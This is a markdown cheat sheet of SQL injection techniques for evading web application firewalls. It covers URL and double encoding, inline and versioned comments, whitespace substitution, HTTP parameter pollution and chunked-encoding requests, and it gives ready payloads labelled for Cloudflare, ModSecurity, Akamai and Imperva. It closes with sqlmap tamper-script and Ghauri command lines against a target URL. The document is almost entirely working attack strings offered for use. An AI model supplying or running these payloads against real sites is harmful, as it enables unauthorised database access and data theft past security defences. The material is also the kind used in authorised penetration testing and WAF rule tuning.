# WAF Bypass Techniques for SQL Injection

## BYPASS DECISION TREE

```
Payload blocked?
├── Try case variation:     uNioN SeLecT
├── Try inline comments:    UN/**/ION SEL/**/ECT
├── Try URL encoding:       %27 %20 %55%4e%49%4f%4e
├── Try double encoding:    %2527 %2520
├── Try whitespace subs:    %0a %09 %0d %0c %0b
├── Try hex values:         0x61646d696e
├── Try CHAR():             CHAR(65)||CHAR(100)||CHAR(109)
├── Try concat:             'ad'||'min'  OR  concat('ad','min')
├── Try versioned comment:  /*!50000UNION*/ /*!50000SELECT*/
├── Try param pollution:    ?id=1&id=UNION+SELECT
├── Try chunked encoding:   Transfer-Encoding: chunked
└── Try JSON unicode:       \u0027 \u0020
```

---

## ENCODING BYPASS

### URL Encoding
```
'  → %27
"  → %22
   → %20
#  → %23
-  → %2D
/  → %2F
;  → %3B
=  → %3D
(  → %28
)  → %29
```

### Double URL Encoding
```
%27 → %2527   (WAF decodes once → still %27, passes; app decodes again → ')
%20 → %2520
%55%4e%49%4f%4e → double encode the whole word
```

### Hex Encoding (MySQL)
```sql
-- Hex strings (no quotes needed):
SELECT 0x61646d696e           -- 'admin'
UNION SELECT 0x757365726e616d65, 0x70617373776f7264  -- 'username','password'

-- In payload:
' UNION SELECT 0x61646d696e,0x70617373776f7264--
```

### CHAR() Functions
```sql
-- MySQL:
SELECT CHAR(117,115,101,114)   -- 'user'
-- MSSQL:
SELECT CHAR(117)+CHAR(115)+CHAR(101)+CHAR(114)
-- PostgreSQL/Oracle:
SELECT CHR(117)||CHR(115)||CHR(101)||CHR(114)
```

---

## COMMENT INJECTION

```sql
-- Standard inline comments (MySQL supports !):
UN/**/ION/**/SEL/**/ECT
UN/*!*/ION/*!*/SEL/*!*/ECT

-- Versioned MySQL comments (bypass if WAF checks keyword bounds):
/*!50000UNION*/
/*!50000SELECT*/
/*!50000UNION*//*!50000SELECT*/NULL,NULL--

-- Multi-line comment between keywords:
UNION
SELECT NULL--

-- Mixed comment types:
UNION/*comment*/SELECT--
UNI/**/ON/**/SEL/**/ECT NULL--
```

---

## WHITESPACE SUBSTITUTION

```
Standard space  → 0x20
Tab             → 0x09  (%09)
Newline         → 0x0a  (%0a)
Carriage return → 0x0d  (%0d)
Form feed       → 0x0c  (%0c)
Vertical tab    → 0x0b  (%0b)
No-break space  → 0xa0

Examples:
UNION%09SELECT%09NULL
UNION%0ASELECT%0ANULL
UNION%0D%0ASELECT
1%09AND%091=1
```

---

## CASE VARIATION

```sql
uNiOn SeLeCt
UNION select
union SELECT
UnIoN sElEcT
uNion sElECt nUlL

-- Random case via sqlmap tamper:
--tamper=randomcase
```

---

## CONCATENATION BYPASS

```sql
-- MySQL: concat() or ||
'ad'||'min'
concat('ad','min')
concat(0x61,0x64,0x6d,0x69,0x6e)

-- MSSQL: +
'ad'+'min'

-- Oracle/PostgreSQL: ||
'ad'||'min'
```

---

## SCIENTIFIC NOTATION (Numeric bypass)

```sql
-- Instead of 1:
1e0
1.0e0
0.1e1

-- Instead of 0:
0e0

-- Example:
1e0 AND 1e0=1e0--   (WAF may not see "1 AND 1=1")
```

---

## PARAMETER POLLUTION (HPP)

```
-- GET:
?id=1&id=UNION+SELECT+NULL,NULL--
?id=1+UNION+SELECT+NULL&id=NULL--

-- JSON with duplicate keys:
{"id": 1, "id": "1 UNION SELECT NULL,NULL--"}

-- Array input:
?id[]=1&id[]=' UNION SELECT NULL--
```

---

## CHUNKED ENCODING BYPASS

```http
POST /search HTTP/1.1
Host: target.com
Transfer-Encoding: chunked

4
id=1
1b
' UNION SELECT NULL,NULL--
0

```
(WAF often inspects non-chunked body; chunked reassembles after WAF inspection)

---

## SPECIFIC WAF BYPASS PAYLOADS

### Cloudflare
```sql
%27%20UNION/**/SELECT/**/NULL,NULL--
'/**/UNION/**/SELECT/**/NULL,NULL--
' /*!UNION*/ /*!SELECT*/ NULL,NULL--
1+UNION+SELECT+0x61646d696e,0x70617373--
```

### ModSecurity
```sql
'/*! UNION *//*! SELECT */NULL,NULL--
' /*!50000UNION*/ /*!50000SELECT*/ NULL,NULL--
1/*!AND*/1=1--
```

### Akamai
```sql
1+UNION+ALL+SELECT+NULL,NULL--
%27+UNION+SELECT+NULL,NULL--
'/**/UNION/**/ALL/**/SELECT/**/NULL,NULL--
```

### Imperva / Incapsula
```sql
'%09UNION%09SELECT%09NULL,NULL--
' UNION%0ASELECT%0ANULL,NULL--
'+uNiOn+sElEcT+nUlL,nUlL--
```

---

## SQLMAP TAMPER SCRIPTS

```bash
# Most effective for WAF bypass (combine):
--tamper=space2comment        # spaces → /**/ 
--tamper=between              # = → between
--tamper=randomcase           # keywords random case
--tamper=charencode           # URL encode chars
--tamper=chardoubleencode     # double URL encode
--tamper=equaltolike          # = → LIKE
--tamper=greatest             # = → GREATEST()
--tamper=modsecurityversioned # versioned comments
--tamper=percentage           # add % between chars (MSSQL)
--tamper=versionedkeywords    # /*!KEYWORD*/
--tamper=bluecoat             # space → %09 (Bluecoat proxy)

# Combined command:
sqlmap -u "URL" \
  --tamper=space2comment,randomcase,between,charencode \
  --level=5 --risk=3 \
  --batch \
  --dbs
```

---

## GHAURI (Better WAF Bypass)

```bash
# Ghauri has native WAF bypass — better than sqlmap for modern WAFs:
ghauri -u "https://target.com/page?id=1" \
  --dbs \
  --level=3 \
  --batch \
  --parse-errors    # show DB errors in responses
```

---

## BASE64 BYPASS (MySQL-specific)

```sql
-- FROM_BASE64 decodes base64 string at query time:
' UNION SELECT FROM_BASE64('c2VsZWN0IHZlcnNpb24oKQ=='),NULL--
-- Decoded: select version()

-- Combine with hex:
' UNION SELECT FROM_BASE64(0x63656c656374207665727369...),NULL--
```

---

## JSON / XML FUNCTION OBFUSCATION

```sql
-- MySQL JSON:
' UNION SELECT json_extract('{"v":1}','$.v'),version()--
' AND json_length('["a","b","c"]')=3--

-- MySQL XML (extractvalue for error-based + obfuscation):
' AND extractvalue(0x0a,concat(0x0a,(SELECT version())))--

-- MSSQL XML:
' UNION SELECT (SELECT * FROM users FOR XML PATH('')),NULL--
```
